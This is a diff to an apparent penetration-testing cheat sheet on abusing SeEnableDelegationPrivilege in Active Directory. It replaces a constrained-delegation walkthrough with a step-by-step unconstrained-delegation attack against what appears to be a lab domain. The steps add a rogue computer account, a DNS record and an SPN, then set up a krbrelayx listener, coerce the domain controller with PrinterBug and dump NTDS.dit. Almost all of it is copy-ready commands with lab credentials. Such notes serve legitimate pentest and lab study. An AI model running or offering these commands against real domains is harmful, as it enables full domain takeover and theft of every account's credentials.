@@ -1232,44 +1232,83 @@ impacket-dpapi credential -file "/path/to/file/locally/master2" -key '0xd9a57072
 [[delegation]]
 === SeEnableDelegationPrivilege
 
-Enable *Kerberos delegation* for an account or computer in AD
+Attack flow 
 
-Scenario: low-priv user has a `SeEnableDelegationPrivilege` in remote access and has a `GenericAll` privilege over anouther computer in AD
+Create computer account
 
-Main goal: extract NTLM hash of `Administrator`
+Add DNS record
 
-1.Configure password of computer
+Add SPN
 
-2.Also can be used tool `impacket-findDelegation` to enemurate delegations , user must have a `SeEnableDelegationPrivilege`!
+Enable delegation
 
-```bash
-impacket-findDelegation   "domain"/"user":"password"
-```
+Trigger authentication
 
-3.Enable *Kerberos delegation* type: *S4U*, Computer is trusted for auth of anouther users
+Capture ticket
 
-```bash
-bloodyAD --host dc.host -d domain -u 'user' -p 'password' add uac 'computer' -f TRUSTED_TO_AUTH_FOR_DELEGATION
-```
+Dump NTDS
 
-4.For what servises account have a privilege of *Kerberos delegation*, modify `msDS-AllowedToDelegateTo` attibute
+Create a computer 
 
 ```bash
-bloodyAD --host dc.host -d domain  -u 'user' -p 'password' set object 'computer' msDS-
-AllowedToDelegateTo -v 'smb/dc.target'
+addcomputer.py -computer-name colosion -computer-pass colosion -dc-ip 10.129.5.144 delegate.vl/N.Thompson:'KALEB_2341'
 ```
 
-5.get kerberos ticket(optional)
+Add a DNS for ticket phishing 
 
 ```bash
-impacket-getST domain/'computer':'password' -spn 'smb/dc.target' -impersonate dc
+dnstool -u 'delegate.vl\colosion$' -p 'colosion' --action add --record colosion.delegate.vl --data 10.10.14.89 --type A -dns-ip 10.129.5.144  dc1.delegate.vl
 ```
 
-5.Extract NTLM hash of user
+Validate a DNS
 
 ```bash
-impacket-secretsdump -k dc.target  
+dig @10.129.5.144 colosion.delegate.vl +noall +answer
 ```
+
+Add spn to created computer. If there is a issues trying a `additional` flag
+
+```bash
+addspn -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/colosion.delegate.vl' -t 'colosion$' -dc-ip 10.129.5.144 dc1.delegate.vl 
+```
+
+Set a flag `TRUSTED_FOR_DELEGATION` for created computer
+
+```bash
+bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'colosion$' -f TRUSTED_FOR_DELEGATION
+```
+
+Check if target is vulnerable for triggering
+
+```bash
+nxc smb dc1.delegate.vl -u 'colosion$' -k   -M coerce_plus
+```
+
+Before setting a `Krbrelayx` listener we must create a `NTLM` hash for computer password
+
+```bash
+pypykatz crypto nt 'colosion'
+```
+
+Set a `Krbrelayx` listener. Hash is taken from `pypykatz`
+
+```bash
+krbrelayx -hashes :49738a5a7c6ccc06392d9af633139895
+```
+
+Trigger `DC` to authorize to our created computer
+
+```bash
+nxc smb dc1.delegate.vl -u 'colosion$' -k  -M coerce_plus -o LISTENER=colosion.delegate.vl METHOD=PrinterBug
+```
+
+When `DC` obtained dump `NTDS.dit`
+
+```bash
+nxc smb dc1.delegate.vl --use-kcache --ntds
+```
+
+
 
 [[cross-session]]
 == Cross-Session
